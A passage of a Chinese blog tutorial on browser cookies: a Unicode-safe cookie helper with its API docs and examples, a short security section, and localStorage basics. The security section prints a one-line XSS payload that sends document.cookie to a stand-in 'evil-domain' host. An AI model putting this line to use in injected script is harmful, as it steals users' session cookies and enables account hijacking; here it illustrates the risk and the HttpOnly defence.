(vEnd.constructor) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">Number</span>:</span><br><span class="line">          sExpires = vEnd === <span class="literal">Infinity</span> ? <span class="string">&quot;; expires=Fri, 31 Dec 9999 23:59:59 GMT&quot;</span> : <span class="string">&quot;; max-age=&quot;</span> + vEnd;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">String</span>:</span><br><span class="line">          sExpires = <span class="string">&quot;; expires=&quot;</span> + vEnd;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">Date</span>:</span><br><span class="line">          sExpires = <span class="string">&quot;; expires=&quot;</span> + vEnd.toUTCString();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">&quot;=&quot;</span> + <span class="built_in">encodeURIComponent</span>(sValue) + sExpires + (sDomain ? <span class="string">&quot;; domain=&quot;</span> + sDomain : <span class="string">&quot;&quot;</span>) + (sPath ? <span class="string">&quot;; path=&quot;</span> + sPath : <span class="string">&quot;&quot;</span>) + (bSecure ? <span class="string">&quot;; secure&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  removeItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey, sPath, sDomain</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!sKey || !<span class="built_in">this</span>.hasItem(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">&quot;=; expires=Thu, 01 Jan 1970 00:00:00 GMT&quot;</span> + ( sDomain ? <span class="string">&quot;; domain=&quot;</span> + sDomain : <span class="string">&quot;&quot;</span>) + ( sPath ? <span class="string">&quot;; path=&quot;</span> + sPath : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  hasItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;(?:^|;\\s*)&quot;</span> + <span class="built_in">encodeURIComponent</span>(sKey).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">&quot;\\$&amp;&quot;</span>) + <span class="string">&quot;\\s*\\=&quot;</span>)).test(<span class="built_in">document</span>.cookie);</span><br><span class="line">  &#125;,</span><br><span class="line">  keys: <span class="comment">/* optional method: you can safely remove it! */</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> aKeys = <span class="built_in">document</span>.cookie.replace(<span class="regexp">/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g</span>, <span class="string">&quot;&quot;</span>).split(<span class="regexp">/\s*(?:\=[^;]*)?;\s*/</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> nIdx = <span class="number">0</span>; nIdx &lt; aKeys.length; nIdx++) &#123; aKeys[nIdx] = <span class="built_in">decodeURIComponent</span>(aKeys[nIdx]); &#125;</span><br><span class="line">    <span class="keyword">return</span> aKeys;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Note: 对于永久cookie我们用了Fri, 31 Dec 9999 23:59:59 GMT作为过期日。如果你不想使用这个日期，可使用世界末日Tue, 19 Jan 2038 03:14:07 GMT，它是32位带符号整数能表示从1 January 1970 00:00:00 UTC开始的最大秒长(即01111111111111111111111111111111, 是 new Date(0x7fffffff * 1e3)).</p>
+</blockquote>
+<h2 id="6-1-写入cookie"><a href="#6-1-写入cookie" class="headerlink" title="6.1 写入cookie"></a>6.1 写入cookie</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</span><br></pre></td></tr></table></figure>
+
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>创建或覆盖一个cookie</p>
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="name-必要"><a href="#name-必要" class="headerlink" title="name (必要)"></a>name (必要)</h4><p>要创建或覆盖的cookie的名字 (string)。</p>
+<h4 id="value-必要"><a href="#value-必要" class="headerlink" title="value (必要)"></a>value (必要)</h4><p>cookie的值 (string)。</p>
+<h4 id="end-可选"><a href="#end-可选" class="headerlink" title="end (可选)"></a>end (可选)</h4><p>最大年龄的秒数 (一年为31536e3， 永不过期的cookie为Infinity) ，或者过期时间的GMTString格式或Date对象; 如果没有定义则会在会话结束时过期 (number – 有限的或 Infinity – string, Date object or null)。</p>
+<h4 id="path-可选"><a href="#path-可选" class="headerlink" title="path (可选)"></a>path (可选)</h4><p>例如 ‘/’, ‘/mydir’。 如果没有定义，默认为当前文档位置的路径。(string or null)。路径必须为绝对路径（参见 RFC 2965）。关于如何在这个参数使用相对路径的方法请参见这段。</p>
+<h4 id="domain-可选"><a href="#domain-可选" class="headerlink" title="domain (可选)"></a>domain (可选)</h4><p>例如 ‘example.com’， ‘.example.com’ (包括所有子域名), ‘subdomain.example.com’。如果没有定义，默认为当前文档位置的路径的域名部分 (string或null)。</p>
+<h4 id="secure-可选"><a href="#secure-可选" class="headerlink" title="secure (可选)"></a>secure (可选)</h4><p>cookie只会被https传输 (boolean或null)。</p>
+<h2 id="6-2-得到cookie"><a href="#6-2-得到cookie" class="headerlink" title="6.2 得到cookie"></a>6.2 得到cookie</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p><code>docCookies.getItem(name)</code></p>
+<h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>读取一个cookie。如果cookie不存在返回null。</p>
+<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><p>name：读取的cookie名 (string).</p>
+<h2 id="6-3-移除cookie"><a href="#6-3-移除cookie" class="headerlink" title="6.3 移除cookie"></a>6.3 移除cookie</h2><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p><code>docCookies.removeItem(name[, path],domain)</code></p>
+<h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>删除一个cookie。</p>
+<h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><p>name：要移除的cookie名(string).</p>
+<h4 id="path-可选-1"><a href="#path-可选-1" class="headerlink" title="path (可选)"></a>path (可选)</h4><p>例如 ‘/’, ‘/mydir’。 如果没有定义，默认为当前文档位置的路径。(string or null)。路径必须为绝对路径（参见 RFC 2965）。关于如何在这个参数使用相对路径的方法请参见这段。</p>
+<h4 id="domain-可选-1"><a href="#domain-可选-1" class="headerlink" title="domain (可选)"></a>domain (可选)</h4><p>例如 ‘example.com’， ‘.example.com’ (包括所有子域名), ‘subdomain.example.com’。如果没有定义，默认为当前文档位置的路径的域名部分 (string或null)。</p>
+<h2 id="6-4-检测cookie"><a href="#6-4-检测cookie" class="headerlink" title="6.4 检测cookie"></a>6.4 检测cookie</h2><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p>docCookies.hasItem(name)</p>
+<h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>检查一个cookie是否存在</p>
+<h3 id="参数-3"><a href="#参数-3" class="headerlink" title="参数"></a>参数</h3><p>name：要检查的cookie名 (string).</p>
+<h2 id="6-5-得到所有cookie的列表"><a href="#6-5-得到所有cookie的列表" class="headerlink" title="6.5 得到所有cookie的列表"></a>6.5 得到所有cookie的列表</h2><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><p>docCookies.keys()</p>
+<h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>返回一个这个路径所有可读的cookie的数组。</p>
+<h2 id="6-6-示例用法"><a href="#6-6-示例用法" class="headerlink" title="6.6 示例用法:"></a>6.6 示例用法:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">docCookies.setItem(<span class="string">&quot;test0&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test1&quot;</span>, <span class="string">&quot;Unicode test: \u00E0\u00E8\u00EC\u00F2\u00F9&quot;</span>, <span class="literal">Infinity</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test2&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2020</span>, <span class="number">5</span>, <span class="number">12</span>));</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test3&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2027</span>, <span class="number">2</span>, <span class="number">3</span>), <span class="string">&quot;/blog&quot;</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test4&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="string">&quot;Sun, 06 Nov 2022 21:43:15 GMT&quot;</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test5&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="string">&quot;Tue, 06 Dec 2022 13:11:07 GMT&quot;</span>, <span class="string">&quot;/home&quot;</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test6&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="number">150</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test7&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="number">245</span>, <span class="string">&quot;/content&quot;</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test8&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;example.com&quot;</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test9&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">docCookies.setItem(<span class="string">&quot;test1;=&quot;</span>, <span class="string">&quot;Safe character test;=&quot;</span>, <span class="literal">Infinity</span>);</span><br><span class="line"></span><br><span class="line">alert(docCookies.keys().join(<span class="string">&quot;\n&quot;</span>));</span><br><span class="line">alert(docCookies.getItem(<span class="string">&quot;test1&quot;</span>));</span><br><span class="line">alert(docCookies.getItem(<span class="string">&quot;test5&quot;</span>));</span><br><span class="line">docCookies.removeItem(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">docCookies.removeItem(<span class="string">&quot;test5&quot;</span>, <span class="string">&quot;/home&quot;</span>);</span><br><span class="line">alert(docCookies.getItem(<span class="string">&quot;test1&quot;</span>));</span><br><span class="line">alert(docCookies.getItem(<span class="string">&quot;test5&quot;</span>));</span><br><span class="line">alert(docCookies.getItem(<span class="string">&quot;unexistingCookie&quot;</span>));</span><br><span class="line">alert(docCookies.getItem());</span><br><span class="line">alert(docCookies.getItem(<span class="string">&quot;test1;=&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<h1 id="7-🍍安全"><a href="#7-🍍安全" class="headerlink" title="7 🍍安全"></a>7 🍍安全</h1><ul>
+<li><p>路径限制并不能阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的iframe, 然后访问其 contentDocument.cookie 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用同源策略保护其不被读取</p>
+</li>
+<li><p>Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 </p>
+</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>HttpOnly 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击</li>
+</ul>
+<h1 id="8-🍏localStorage"><a href="#8-🍏localStorage" class="headerlink" title="8 🍏localStorage"></a>8 🍏localStorage</h1><h2 id="什么是localStorage"><a href="#什么是localStorage" class="headerlink" title="什么是localStorage"></a>什么是localStorage</h2><p>在HTML5中，新加入了一个localStorage特性，这个特性主要是用来作为本地存储来使用的，<strong>解决了cookie存储空间不足的问题</strong>(cookie中每条cookie的存储空间为4k)，localStorage中一般浏览器支持的是5M大小，这个在不同的浏览器中localStorage会有所不同。</p>
+<h2 id="localStorage的优势"><a href="#localStorage的优势" class="headerlink" title="localStorage的优势"></a>localStorage的优势</h2><p>1、localStorage拓展了cookie的4K限制<br>2、localStorage会可以将第一次请求的数据直接存储到本地，这个相当于一个5M大小的针对于前端页面的数据库，相比于cookie可以节约带宽，但是这个却是只有在高版本的浏览器中才支持的<br>3、localStorage与sessionStorage的唯一一点区别就是localStorage属于永久性存储，而sessionStorage属于当会话结束的时候，sessionStorage中的键值对会被清空</p>
+<h2 id="localStorage的使用"><a href="#localStorage的使用" class="headerlink" title="localStorage的使用"></a>localStorage的使用</h2><p>localStorage.getItem(key):获取指定key本地存储的值<br>localStorage.setItem(key,value)：将value存储到key字段</p>
+<p>比如：<br>在A页面中先存储：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> imgs = obj_mainform.archivesId  <span class="comment">//声明个变量存储下数据</span></span><br><span class="line"><span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;key&#x27;</span>,imgs);  <span class="comment">//将变量imgs存储到name字段</span></span><br></pre></td></tr></table></figure>
+
+<p>在B页面中使用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> naid = <span class="built_in">localStorage</span>.getItem(<span class="string">&quot;key&quot;</span>); <span class="comment">//获取指定key本地存储的值</span></span><br></pre></td></tr></table></figure>
+
+<p>以上就是localStorage.setItem()和localStorage.getItem()的使用方式</p>
+<p><a class="link" target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/lufeiludaima/p/pz20190203.html">token详解<i class="fas fa-external-link-alt"></i></a></p>
+<p>前端一般把服务器获取的token存储到localStorage中</p>
+<p><a class="link" target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/qq_38128179/article/details/85060052?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165762866216781435488863%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165762866216781435488863&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-85060052-null-null.142%5Ev32%5Edown_rank,185%5Ev2%5Econtrol&utm_term=localStorage&spm=1018.2226.3001.4187">licaiStorage详细用法<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/60c13168cc8f">插件vue-cookies的用法<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/a772116804/article/details/104677865">Vue中使用js-cookie插件<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="💬完结撒花"><a href="#💬完结撒花" class="headerlink" title="💬完结撒花~~"></a>💬完结撒花~~</h1>
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：cookie详解</li>
+        <li>本文作者：馨er</li>
+        <li>创建时间：2022-07-11 23:55:27</li>
+        <li>
+            本文链接：https://sjxbbd.vercel.app/2022/07/11/7c11bcdce36f/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/cookie/">#cookie</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/vue/">#vue</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev" rel="prev" href="/2022/07/13/c12be16f65df/">
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">sass详解</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next" rel="next" href="/2022/05/23/5a1877438b92/">
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">JavaScript高级</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">馨er</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io" rel="external nofollow noopener noreferrer">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep" rel="external nofollow noopener noreferrer">Keep v3.4.5</a>
+        </div>
+        
+            <div class="icp-info info-item"><a target="_blank" rel="external nofollow noopener noreferrer" href="https://beian.miit.gov.cn">晋ICP备2022004221号-1</a></div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFCookie"><span class="nav-text">1 什么是Cookie</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8JavaScript%E6%93%8D%E4%BD%9CCookie"><span class="nav-text">2 使用JavaScript操作Cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E5%88%9B%E5%BB%BACookie"><span class="nav-text">2.1 创建Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E4%BD%BF%E7%94%A8JavaScript%E8%AF%BB%E5%8F%96Cookie"><span class="nav-text">2.2 使用JavaScript读取Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E4%BD%BF%E7%94%A8JavaScript%E4%BF%AE%E6%94%B9Cookie"><span class="nav-text">2.3 使用JavaScript修改Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-%E4%BD%BF%E7%94%A8JavaScript%E5%88%A0%E9%99%A4Cookie"><span class="nav-text">2.4 使用JavaScript删除Cookie</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-Cookie%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">3 Cookie字符串</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-JavaScript-Cookie%E5%AE%9E%E4%BE%8B"><span class="nav-text">4 JavaScript Cookie实例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-%E8%AE%BE%E7%BD%AE-cookie-%E5%80%BC%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">4.1 设置 cookie 值的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-%E8%8E%B7%E5%8F%96-cookie-%E5%80%BC%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">4.2 获取 cookie 值的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-%E6%A3%80%E6%B5%8B-cookie-%E5%80%BC%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">4.3 检测 cookie 值的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-4-%E5%AE%8C%E6%95%B4%E7%A4%BA%E4%BE%8B"><span class="nav-text">4.4 完整示例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-Document-cookie%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3-%E8%BF%90%E8%A1%8C%E5%AE%9E%E4%BE%8B"><span class="nav-text">5 Document.cookie使用文档+运行实例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-%E8%AF%AD%E6%B3%95"><span class="nav-text">5.1 语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-%E7%A4%BA%E4%BE%8B"><span class="nav-text">5.2 示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-1-%E7%A4%BA%E4%BE%8B1%EF%BC%9A%E7%AE%80%E5%8D%95%E7%94%A8%E6%B3%95"><span class="nav-text">5.2.1 示例1：简单用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-2-%E7%A4%BA%E4%BE%8B2%EF%BC%9A%E5%BE%97%E5%88%B0%E5%90%8D%E4%B8%BAtest2%E7%9A%84cookie"><span class="nav-text">5.2.2 示例2：得到名为test2的cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-3-%E7%A4%BA%E4%BE%8B3%EF%BC%9A%E5%8F%AA%E6%89%A7%E8%A1%8C%E6%9F%90%E4%BA%8B%E4%B8%80%E6%AC%A1"><span class="nav-text">5.2.3 示例3：只执行某事一次</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6%F0%9F%8D%87%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%A1%86%E6%9E%B6%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%95%B4%E6%94%AF%E6%8C%81unicode%E7%9A%84cookie%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5%E5%99%A8"><span class="nav-text">6🍇一个小框架：一个完整支持unicode的cookie读取&#x2F;写入器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-%E5%86%99%E5%85%A5cookie"><span class="nav-text">6.1 写入cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="nav-text">语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0"><span class="nav-text">参数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#name-%E5%BF%85%E8%A6%81"><span class="nav-text">name (必要)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#value-%E5%BF%85%E8%A6%81"><span class="nav-text">value (必要)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#end-%E5%8F%AF%E9%80%89"><span class="nav-text">end (可选)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#path-%E5%8F%AF%E9%80%89"><span class="nav-text">path (可选)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#domain-%E5%8F%AF%E9%80%89"><span class="nav-text">domain (可选)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#secure-%E5%8F%AF%E9%80%89"><span class="nav-text">secure (可选)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-2-%E5%BE%97%E5%88%B0cookie"><span class="nav-text">6.2 得到cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95-1"><span class="nav-text">语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0-1"><span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0-1"><span class="nav-text">参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-3-%E7%A7%BB%E9%99%A4cookie"><span class="nav-text">6.3 移除cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95-2"><span class="nav-text">语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0-2"><span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0-2"><span class="nav-text">参数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#path-%E5%8F%AF%E9%80%89-1"><span class="nav-text">path (可选)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#domain-%E5%8F%AF%E9%80%89-1"><span class="nav-text">domain (可选)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-4-%E6%A3%80%E6%B5%8Bcookie"><span class="nav-text">6.4 检测cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95-3"><span class="nav-text">语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0-3"><span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0-3"><span class="nav-text">参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-5-%E5%BE%97%E5%88%B0%E6%89%80%E6%9C%89cookie%E7%9A%84%E5%88%97%E8%A1%A8"><span class="nav-text">6.5 得到所有cookie的列表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95-4"><span class="nav-text">语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0-4"><span class="nav-text">描述</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-6-%E7%A4%BA%E4%BE%8B%E7%94%A8%E6%B3%95"><span class="nav-text">6.6 示例用法:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-%F0%9F%8D%8D%E5%AE%89%E5%85%A8"><span class="nav-text">7 🍍安全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-%F0%9F%8D%8FlocalStorage"><span class="nav-text">8 🍏localStorage</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFlocalStorage"><span class="nav-text">什么是localStorage</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#localStorage%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="nav-text">localStorage的优势</span></a></li><li class="nav-item 